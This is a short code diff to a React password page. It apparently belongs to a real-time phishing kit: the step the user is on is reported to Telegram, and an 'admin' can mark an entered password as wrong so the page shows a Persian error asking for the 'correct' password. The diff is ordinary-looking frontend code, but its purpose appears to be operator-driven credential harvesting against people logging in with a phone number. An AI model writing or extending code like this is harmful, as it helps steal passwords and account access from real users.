@@ -22,6 +22,7 @@ const AuthPassword = () => {
   const phoneNumber = location.state?.phoneNumber || "";
   const sessionId =
     location.state?.sessionId || sessionStorage.getItem("sessionId");
+  const hasError = location.state?.hasError || false;
 
   useEffect(() => {
     const checkAccess = async () => {
@@ -32,7 +33,7 @@ const AuthPassword = () => {
 
       // Check if user can access this step
       const canAccess = canAccessAuthStep(sessionId, "password");
-      if (!canAccess) {
+      if (!canAccess && !hasError) {
         setIsBlocked(true);
         setErrors({
           password:
@@ -41,12 +42,19 @@ const AuthPassword = () => {
         return;
       }
 
+      // If admin marked password as wrong, show error
+      if (hasError) {
+        setErrors({
+          password: "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
+        });
+      }
+
       // Update Telegram that user is on password page
       await setUserCurrentStep(sessionId, "auth_password");
     };
 
     checkAccess();
-  }, [sessionId, navigate]);
+  }, [sessionId, navigate, hasError]);
 
   const validatePassword = (password: string): boolean => {
     // Password must be at least 8 characters and contain numbers and letters
